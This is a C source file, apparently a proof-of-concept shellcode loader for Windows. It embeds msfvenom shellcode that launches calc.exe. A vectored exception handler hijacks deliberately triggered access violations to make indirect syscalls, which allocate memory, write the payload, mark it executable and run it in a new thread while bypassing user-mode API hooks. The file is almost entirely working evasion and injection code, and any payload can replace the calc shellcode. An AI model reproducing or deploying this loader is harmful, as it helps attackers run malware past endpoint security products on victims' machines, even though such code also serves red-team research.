#include <Windows.h>
#include <stdio.h>
#include "Structs.h"
#include "Common.h"


// Define global variables for NTDLL_CONFIG and NT_API structures
NTDLL_CONFIG	NtdllConfig		= { 0 };
PNTDLL_CONFIG	pNtdllConfig	= &NtdllConfig;

NT_API			NtApi			= { 0 };
PNT_API			pNtApi			= &NtApi;


/////////////////////////////////////////////////////////////////

//  msfvenom -p windows/x64/exec CMD=calc.exe -f c EXITFUNCT=thread

unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";


/////////////////////////////////////////////////////////////////


LONG WINAPI VectoredExceptionHandler(PEXCEPTION_POINTERS pException) {

	if (pException->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {

#ifdef DEBUG
		printf("[!] Triggered ACCESS_VIOLATION exception!!!!\n");
		printf("\t[!] Exception address: 0x%p\n", pException->ExceptionRecord->ExceptionAddress);
#endif

		PCONTEXT Context = pException->ContextRecord;

		Context->R10 = Context->Rcx;		// like mov r10, rcx
		Context->Rax = Context->Rip;		// After triggering access violation, Rip contains the SSN
		Context->Rip = Context->R11;		// R11 = Random syscall instruction's address
		Context->R11 = NULL;				// Cleanup

		return EXCEPTION_CONTINUE_EXECUTION;
	}

	return EXCEPTION_CONTINUE_SEARCH;
}



INT main() {

	// Init NTDLL_CONFIG, NT_API structures
	if (!FetchNtApi())
		return ERROR_FUNCTION_FAILED;


	// Registering Vectored Exception Handler (VEH)
	PVOID pVEH = AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)VectoredExceptionHandler);
	if (pVEH == NULL) {
#ifdef DEBUG
		printf("[-] AddVectoredExceptionHandler failed: 0x%X\n", GetLastError());
#endif
		return ERROR_FUNCTION_FAILED;
	}
	printf("\n\n[+] VEH registered successfully: 0x%p\n", pVEH);


	NTSTATUS	status		= NULL;
	PVOID		pAddress	= NULL;
	SIZE_T		sSize		= sizeof(buf), sNmbBytesWritten = NULL;
	ULONG		uOldPrtc	= NULL;
	HANDLE		hThread		= NULL;

	// Memory allocation for payload
#ifdef DEBUG
	printf("[*] Going to allocate memory...\n");
#endif

	SET_SYSCALL(pNtApi->NtAllocateVirtualMemory);
	status = TRIGGER_VEH((HANDLE)-1, &pAddress, NULL, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (status != 0x00) {
#ifdef DEBUG
		printf("[-] NtAllocateVirtualMemory failed: 0x%X\n", status);
#endif
		return ERROR_FUNCTION_FAILED;
	}
#ifdef DEBUG
	printf("[+] Allocated memory: 0x%p\n\n", pAddress);
#endif

	// sSize = sizeof(buf)
	sSize = sizeof(buf);


	// Write payload to allocated memory
#ifdef DEBUG
	printf("[*] Going to write payload to allocated memory...\n");
#endif

	SET_SYSCALL(pNtApi->NtWriteVirtualMemory);
	status = TRIGGER_VEH((HANDLE)-1, pAddress, buf, sSize, &sNmbBytesWritten);
	if (status != 0x00 && sNmbBytesWritten != sSize) {
#ifdef DEBUG
		printf("[-] NtWriteVirtualMemory failed: 0x%X\n", status);
#endif
		return ERROR_FUNCTION_FAILED;
	}
#ifdef DEBUG
	printf("[+] %d bytes of payload written in allocated memory\n\n", (INT)sNmbBytesWritten);
#endif


	// Setting PAGE_EXECUTE_READ permission to allocated memory
#ifdef DEBUG
	printf("[*] Going to change memory protection...\n");
#endif

	SET_SYSCALL(pNtApi->NtProtectVirtualMemory);
	status = TRIGGER_VEH((HANDLE)-1, &pAddress, &sSize, PAGE_EXECUTE_READ, &uOldPrtc);
	if (status != 0x00) {
#ifdef DEBUG
		printf("[-] NtProtectVirtualMemory failed: 0x%X\n", status);
#endif
		return ERROR_FUNCTION_FAILED;
	}
#ifdef DEBUG
	printf("[+] New access protection set\n\n");
#endif


	// Creating a new thread
#ifdef DEBUG
	printf("[*] Going to create a new thread...\n");
#endif

	SET_SYSCALL(pNtApi->NtCreateThreadEx);
	status = TRIGGER_VEH(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, NULL, NULL, NULL, NULL, NULL);
	if (status != 0x00) {
#ifdef DEBUG
		printf("[-] NtCreateThreadEx failed: 0x%X\n", status);
#endif
		return ERROR_FUNCTION_FAILED;
	}
#ifdef DEBUG
	printf("[+] New thread created: 0x%p\n\n", hThread);
#endif


	// Calling NtWaitForSingleObject
#ifdef DEBUG
	printf("[*] Going to call NtWaitForSingleObject...\n");
#endif

	SET_SYSCALL(pNtApi->NtWaitForSingleObject);
	status = TRIGGER_VEH(hThread, FALSE, NULL);
	if (status != 0x00) {
#ifdef DEBUG
		printf("[-] NtWaitForSingleObject failed: 0x%X\n", status);
#endif
		return ERROR_FUNCTION_FAILED;
	}


	return ERROR_SUCCESS;
}